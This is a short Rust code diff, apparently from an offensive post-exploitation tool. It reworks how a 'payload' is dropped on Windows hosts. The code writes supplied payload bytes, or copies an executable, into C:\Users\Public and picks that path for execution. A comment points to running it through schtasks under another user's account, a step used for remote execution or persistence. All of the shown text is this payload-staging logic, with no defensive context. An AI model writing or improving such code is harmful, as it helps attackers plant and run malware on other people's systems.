@@ -318,19 +318,19 @@ mod inner {
 
         // Write payload bytes to disk when provided.
         let drop_path: String;
-        let effective_path: &str = if !data.is_empty() {
+        let effective_path: &str = {
             let fname = std::path::Path::new(cmd_path)
                 .file_name()
                 .map(|f| f.to_string_lossy().into_owned())
                 .unwrap_or_else(|| format!("{}.exe", svc_name));
             drop_path = format!("C:\\Users\\Public\\{}", fname);
-            if drop_path.to_lowercase() != cmd_path.to_lowercase() {
+            if !data.is_empty() {
                 fs::write(&drop_path, data)
                     .map_err(|e| format!("write payload failed: {}", e))?;
+            } else if drop_path.to_lowercase() != cmd_path.to_lowercase() {
+                let _ = fs::copy(cmd_path, &drop_path);
             }
-            &drop_path
-        } else {
-            cmd_path
+            if std::path::Path::new(&drop_path).exists() { &drop_path } else { cmd_path }
         };
 
         // Strip leading ".\" from user for schtasks /RU (schtasks rejects "." as domain).
